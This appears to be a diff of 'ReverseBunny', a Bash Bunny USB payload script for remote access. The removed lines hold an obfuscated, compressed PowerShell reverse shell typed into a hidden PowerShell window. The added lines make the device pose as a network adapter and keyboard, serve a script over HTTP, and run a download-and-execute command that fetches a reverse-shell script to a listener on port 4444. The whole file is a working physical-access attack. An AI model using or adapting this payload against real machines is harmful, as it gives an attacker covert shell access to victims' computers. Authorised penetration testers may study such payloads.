@@ -1,47 +1,44 @@
 #!/bin/bash
 #
 # Title:         ReverseBunny
-# Description:   Get remote access using obfuscated powershell code - If caught by AV, feel free to contact me.
+# Description:   Get remote access, using an obfuscated powershell reverse shell.
 # Author:        0iphor13
-# Version:       1.3
+# Version:       1.5
 # Category:      Remote_Access
-# Attackmodes:   HID
+# Attackmodes:   HID, RNDIS_ETHERNET
 
 LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
 
-DUCKY_LANG de
+GET SWITCH_POSITION
+GET HOST_IP
 
-ATTACKMODE HID
+cd /root/udisk/payloads/$SWITCH_POSITION/
 
-#If needed, use this option
-#WAIT_FOR_PRESENT Your_Device
+# starting server
+LED SPECIAL
 
+# disallow outgoing dns requests so the server is accessible immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+#Opens hidden powershell instance
 Q DELAY 1500
 Q GUI r
 Q DELAY 500
-Q STRING "powershell -NoP -NonI -W hidden"
+Q STRING "powershell -NoP -NonI -w h"
 Q DELAY 500
 Q ENTER
 
-Q DELAY 250
-Q STRING "\$I='0.0.0.0';\$P=4444;&(\$SHellid[1]+\$shELlId[13]+'x')(NEw-ObJECt sYstem.iO.coMPRESsIOn.dEFLateSTReAm([sYstEM.I"
-Q DELAY 250
-Q STRING "o.MEmORyStReAm] [sYstEM.cOnvErT]::frOMBasE64sTrIng('jVJhb9owEP3c/IpT5A1HBUNXdR8apWqJPBSNUdSkWyuCogAWpAIHJa5K2vS/72yaqeoH"
-Q DELAY 250
-Q STRING "urN8nH3Pz88vkNmjlJV3aVsWHB3ROEmSrgNgFl6LtbxmYTsJTisxAQfiE4RVawTEBxg+QSBDnXSh29yz/8WRmHM6NQjd3Xf+ZT2RAaPbBX1LDIjEqoYWvh1R"
-Q DELAY 250
-Q STRING "9X6lueq30UJgk83QGmIsENWN4fe+0h2IzTFoNOhcw4ehd6wYc5zERm2MSFNhjW1NiknPfaNtOnWT9Q4yHPoKn4Umbhj6FUAv267y4uT0/xmMzDcGa1yIsoQJ"
-Q DELAY 250
-Q STRING "l0oUU1A5zHOpMvkoGGOWZV+6lkWG6Tpd+4+lyjfgwSQSO8W4nOeLTC6n5+dXoR8EbCBUv1KipMT8MR19cO5J/tTJ+w/cVxDel4pv2IgrFl7Pf3JVssgf"
-Q DELAY 250
-Q STRING "++sA76YkaJOx45LSI3NNFUaFuNpQvcOeikwJ+l5Fu9d+v2RDIZdq5biTGSqYTKdk5vUY+352dnpWf3npvbpPq2AoKCWZh3w3PF2gSk0yw6OjZbRynI4U0HN"
-Q DELAY 250
-Q STRING "eXLLw6AhFX/cfhB9BJ7rfilG64VDel5H4xSJxp5h5ceOAY/Sqm0Au31gzlP3s0UzcAVnAt4uvJ3V+qzr4pmw0wN7OI8/Hdl/bdDkOwT6myNAZ5vNUZbl02DZ"
-Q DELAY 250
-Q STRING "Vq2P7AmyXVB6dKO23+OA33srR8Iij4Ttj058i0DZVWkHFhlwO8F268WN9G66o8+qitf46Dzl1rL8='),[Io.COmpressIoN.coMPressiONmoDe]::decOMp"
-Q DELAY 250
-Q STRING "ReSS ) | %{ NEw-ObJECt  systEm.io.STREAmReadEr(\$_ , [sysTeM.TExt.encODIng]::AscIi)}| % {\$_.readTOeNd()} )"
-Q DELAY 250
-Q ENTER
+Q DELAY 500
 
+#Insert attacking IP & Port below
+Q STRING "\$I='0.0.0.0';\$P=4444;"
+Q DELAY 250
+Q STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/RevBunny.ps1\")"
+Q DELAY 400
+Q ENTER
 LED FINISH
